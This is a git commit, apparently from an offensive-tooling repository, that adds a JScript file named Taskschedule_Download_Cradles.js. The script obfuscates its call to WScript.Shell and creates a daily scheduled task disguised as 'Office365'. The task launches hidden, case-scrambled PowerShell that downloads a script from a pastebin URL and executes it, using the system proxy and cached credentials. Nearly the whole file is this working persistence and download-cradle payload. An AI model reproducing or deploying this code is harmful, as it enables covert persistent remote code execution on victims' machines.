49fcdab60486795d22b266fd47cafa6089f10898
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 21:47:18 +0100

    Create Taskschedule_Download_Cradles.js

---
+++ Taskschedule_Download_Cradles.js
@@ -0,0 +1,11 @@
+
+
+
+
+
+
+
+
+#This .js script can be used, to create a taskschedule persistence with a proxy aware PowerShell Download Cradle
+c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'ht\'+\'tps://pastebin.com/raw/Qpiz8y6c\')"', 0);
